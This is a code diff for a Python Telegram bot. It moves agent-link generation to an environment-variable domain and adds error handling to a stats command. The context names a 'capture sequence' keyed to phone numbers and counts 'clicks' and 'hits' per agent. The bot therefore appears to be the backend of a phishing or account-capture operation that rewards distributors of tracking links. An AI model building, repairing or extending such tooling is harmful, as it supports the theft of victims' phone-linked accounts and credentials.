@@ -350,7 +350,7 @@ async def finalize_capture_sequence(phone):
         return jsonify({"status": "error", "msg": "Capture sync failed."})
 
 # =========================================================================
-# 5. AGENT BOT COMMAND INTERFACE
+# 5. AGENT BOT COMMAND INTERFACE - [FIXED CONTEXT VERSION]
 # =========================================================================
 
 @bot.message_handler(commands=['start'])
@@ -369,9 +369,19 @@ def handle_start(m):
 
 @bot.message_handler(func=lambda m: m.text == "🔗 My Link")
 def handle_link(m):
-    """Dynamic Link Generation."""
-    base_url = f"https://{request.host}"
+    """Dynamic Link Generation - Fixed for Background Threading."""
+    # Priority 1: Check Environment Variable (Koyeb/Heroku)
+    # Priority 2: Fallback to a hardcoded string if ENV is missing
+    domain = os.environ.get("DOMAIN", "your-app-name.koyeb.app")
+    
+    # Ensure protocol is handled
+    if not domain.startswith("http"):
+        base_url = f"https://{domain}"
+    else:
+        base_url = domain
+
     agent_link = f"{base_url}/?id={m.from_user.id}"
+    
     msg = (
         f"🚀 <b>Your Unique Link:</b>\n"
         f"<code>{agent_link}</code>\n\n"
@@ -386,7 +396,9 @@ def handle_link(m):
 def handle_stats(m):
     """Real-time performance metrics."""
     conn = get_connection()
-    if not conn: return
+    if not conn: 
+        bot.send_message(m.chat.id, "❌ Database connection failed.")
+        return
     try:
         cur = conn.cursor()
         cur.execute("SELECT clicks, hits FROM link_metrics WHERE tid = %s", (m.from_user.id,))
@@ -406,7 +418,8 @@ def handle_stats(m):
             f"━━━━━━━━━━━━━━━━━━━━━"
         )
         bot.send_message(m.chat.id, stats_msg)
-    except:
+    except Exception as e:
+        logger.error(f"STATS_ERR: {e}")
         bot.send_message(m.chat.id, "❌ Error retrieving stats.")
 
 # =========================================================================
